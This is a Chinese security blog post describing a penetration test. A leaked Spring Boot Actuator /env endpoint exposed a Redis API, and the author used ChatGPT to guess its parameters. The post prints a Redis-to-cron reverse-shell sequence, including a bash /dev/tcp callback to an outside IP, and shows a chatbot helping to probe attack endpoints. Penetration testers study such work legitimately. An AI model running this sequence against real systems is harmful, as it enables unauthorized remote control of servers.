<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/V8tmEXFevS9DlX4thppuOA)

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ATcz6jUJnFNeOxRzVZ9Lbc0INLwTJTZT1GaNutZrfDn6csvjBoS2ox0efLUEexXqPEcVbYfbLo8w/640?wx_fmt=png)

 **Part1 前言** 
--------------

**大家好，我是 ABC_123，公众号正式更名为” 希潭实验室”**。今天晚上喝了一大杯青岛的散装原浆啤酒，心情大好，回来之后，和老哥讨论了一个关于 Springboot 的 Actuator 信息泄露漏洞的利用，虽然最终没有拿下权限，还是有一些心得的，于是笔耕不辍，把这次真实的渗透测试案例记录下来，分享给大家。

平时我们在做渗透测试或者红队评估项目的时候，都会遇到 SpringBoot 的 Actuator 信息泄露漏洞，发现了 **/actuator/env** 接口，但是苦于没有 **/refresh** 接口、没有 **/heapdump** 文件、也没有 **/jolokia/list**、也没有 **/httptrace** 端口等等，接下来可能就是无解，可能会选择放弃，但是 / env 里面会泄露很多 api 接口及其它的敏感信息，**遇到 api 接口，我们可能会苦于不知道需要向该 API 接口提交哪些参数，或者该 API 接口还有哪些未知的功能实现**，ABC_123 今天想到了用 chatGPT 帮我们去猜测一下未知的 API 接口实现和提交的参数，取得了一定的效果！

**建议大家把公众号 “希潭实验室” 设为星标，否则可能就看不到啦！**因为公众号现在只对常读和星标的公众号才能展示大图推送。操作方法：点击右上角的【...】，然后点击【设为星标】即可。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450DbhnGmO67ewLDJqstfHZSHdFeDURNa0QpfjclGrvg0lfANPtuLbf5Ddur3HZmdfAydibIf9zazCKQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

 **Part2 技术研究过程** 
------------------

*   **/env 接口发现操作 redis 相关的 api**
    -----------------------------
    

通过查看 / actuator/env 接口，发现了一处 **/api/public/test/redis/set": ["post":["tags":[Redis 测试操作"]** 的信息泄露，接下来我的老哥师傅就想到了，有没有可能利用这个接口，实现对 redis 反弹 shell 的利用呢？这是一个好思路，但是 **/actuator/env** 接口只给出了 **/redis/set** 功能，并没有给出如何去设置 key 的值。那么我们首先要解决的一个问题就是它的设置 key 的接口是什么及提交的参数是什么，我们只能手工猜测了，**这时候我们可以借助强大的 chatGPT 来帮我们猜一猜试一试**。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ADss0CKD8NBiciaNEictP1ibib8icm5K3Y73CDUsuyNhExYLWWoMiaDBNKgzygwV8ia7R1MZPKrxe9JqxQhw/640?wx_fmt=png)

*   **接下来就是 chatGPT 的表现时刻了**
    ------------------------
    

首先 ABC_123 问了 chatGPT 如下这个问题，目标是测试一下 chatGPT 对这个 api 接口的理解程度，发现结果还是不错的，chatGPT 完美的解释了这个接口的实现功能。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ADss0CKD8NBiciaNEictP1ibib85mauJecKdITbgdDhupSTTu9HN69PibpYmsMS2LR4JeXkMzzicNZgtib1Q/640?wx_fmt=png)

接下来查了一下笔记，发现 redis 反弹 shell 的利用语句大致如下：

**redis-cli -h 192.168.237.135**

**set x "\n* * * * * bash -i >& /dev/tcp/192.168.237.133/53 0>&1\n"**

**config set dir /var/spool/cron/**

**config set dbfilename root**

**Save**

通过上述命令我们知道，如果想通过 redis 反弹 shell 拿权限的话，**首先必须得有设置 key 值的功能**。于是 ABC_123 又问了第 2 个问题，让 chatGPT 帮我们猜一下这个 api 接口的设置 key 值的功能可能的实现方法。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ADss0CKD8NBiciaNEictP1ibib88y2Ll8G8S6pdrev7AA6IlCUtekgwwRCQ4wpStnsJwZRibuT0Wd7yI2w/640?wx_fmt=png)

我发给老哥测试了一下，结果发现以 POST 请求提交 chatGPT 给出的数据包居然成功了！如下图所示：设置 key 的值之后，**通过 /redis/get?key=dir 成功获取到了我们设置的 key 值，说明 chatGPT 给出的语句准确无误**，不得不感叹 chatGPT 的强大。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ADss0CKD8NBiciaNEictP1ibib8ibkibljwCMvMg4kmhROEK9GibjStTibnrQ1QQvMh9bWQW5ciaVMyPOUy4MQ/640?wx_fmt=png)

到这里我突然发现，还缺少一个 redis 的 save 功能才能利用成功。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ADss0CKD8NBiciaNEictP1ibib8W4SaUH9AUHJY01mibfoW0aN8wx975RGMFFaPfNtMTv073xuwVcYXVlg/640?wx_fmt=png)

接下来我们让 chatGPT 帮我们猜测一下 redis 接口的 save 功能可能的实现方法，遗憾的是，并没有成功。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ADss0CKD8NBiciaNEictP1ibib8pzcsOx56NofvuupicLhFp2nA7ic2n7MhsiaRWhYwCEzVHcTtTV8W6DV8g/640?wx_fmt=png)

于是 ABC_123 又让 chatGPT 再给出几个其它的实现 save 功能的可能的接口实现方法。如下图所示，chatGPT 又给了我们 6 个可能的接口实现。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ADss0CKD8NBiciaNEictP1ibib8MOpdfR5KpXp6viawjOVMpqW1Nr68bFUClZibMR5MoVxeahI2eep1oiarQ/640?wx_fmt=png)

后续比较遗憾的是，上述 chatGPT 给出的几个可能的带有 save 功能的接口都没有测试成功。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ADss0CKD8NBiciaNEictP1ibib8oQm69VFIWd1lqBpq50tYzonq6BYCq6pxEjiajoc0vVLFDmF8QkviaL4Q/640?wx_fmt=png)

最后我们发现，该 redis 的操作接口可能根本就没有关于 redis 的 save 功能的实现，但是 ABC_123 感觉这个方法还是不错的，大家后续遇到 / actuator/env 接口或者**其他的 API 接口不知道提交参数的情况下，不防让 chatGPT 帮忙猜测一下吧，ABC_123 感觉后续肯定会有大用处的**。

于是最后又让 chatGPT 努力了一把，ABC_123 又问了这么一个问题：

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ADss0CKD8NBiciaNEictP1ibib8ib2R1Eg1TQafScUSD32cZyB1m2uA90Nxqg0kMpFSFHe6tjvzwD8jE8Q/640?wx_fmt=png)

可以看到 chatGPT 参考 **/test/redis/get?key=dir** 功能的，猜测了很多其它 api 接口功能的实现，我们可以挨个测试一遍，由此可见，chatGPT 可以帮助我们节省很多脑力和体力。

 **Part3 总结** 
--------------

**1.**   虽然最后通过操作 redis 的 api 接口反弹 shell 没有成功，但是这个思路 ABC_123 感觉还是值得实践的，**至少我们挖掘到了一个可用的高危漏洞**，毕竟能获得设置、修改、删除 redis 数据库的权限也是致命的。

**2.**   在渗透测试或者红队评估项目中，看来还是得关注最新的技术，多动脑筋会有意想不到的收获。

**3.**   chatGPT 在我们网络安全日常工作中，还有很多其它的用处，后续文章 ABC_123 会专门总结分享给大家。  

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A5qqg2iaK6KIYYR8y6pF5Rh3JHDibOKOop204nXz618iawdRb8dABicMPtHb2PkJE8x6koJO5HyuwZJQ/640?wx_fmt=png)

公众号专注于网络安全技术分享，包括 APT 事件分析、红队攻防、蓝队分析、渗透测试、代码审计等，每周一篇，99% 原创，敬请关注。

Contact me: 0day123abc#gmail.com(replace # with @)